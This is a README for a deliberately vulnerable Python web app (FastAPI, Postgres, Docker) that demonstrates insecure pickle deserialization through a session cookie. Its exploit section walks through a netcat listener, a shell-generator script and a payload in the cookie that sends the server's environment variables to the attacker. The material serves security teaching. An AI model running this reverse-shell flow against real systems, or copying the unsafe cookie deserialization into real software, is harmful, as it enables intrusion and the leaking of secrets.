# Demo Insecure Deserialization
Demo Insecure Deserialization in Python web application using FastAPI + Async SQLAlchemy + Postgres database + Docker.

# prerequirement
This app require create postgress database before start
```
docker compose up -d --build postgres
docker compose exec -it postgres bash
createdb -h localhost -p 5432 -U dev-user ktltat_db
psql -h localhost -p 5432 -U dev-user -d ktltat_db
```

# run
Back to terminal and follow below steps:
```
docker compose up -d --build
docker compose exec ktltat_app alembic revision --autogenerate -m "initdb"
docker compose exec ktltat_app alembic upgrade head
```

![Image](images/app_login.png)

![Image](images/app_index.png)

# exploit
## Init netcat listener

```
nc -nvlp 1337 
```
![Image](images/init_netcat_listener.png)

## Get your local ip

```
ip a
note: local ip often is formated: 192.168.x.x
```
![Image](images/get_your_local_ip.png)

## Create shell
```
note: Must change variable local_ip in shell_grenerator.py file before
python shell_grenerator.py
```
![Image](images/generate_shell.png)

## Send request attach shell
Attach shell get from above step attach to cookie session
![Image](images/send_request_attach_shell.png)

## Exploit success
After send request attach shell, pickle module ran "env" command and sent output to netcat listener

![Image](images/exploit_success.png)

This code in path app/dependency.py is exploited

![Image](images/code_is_exploited.png)
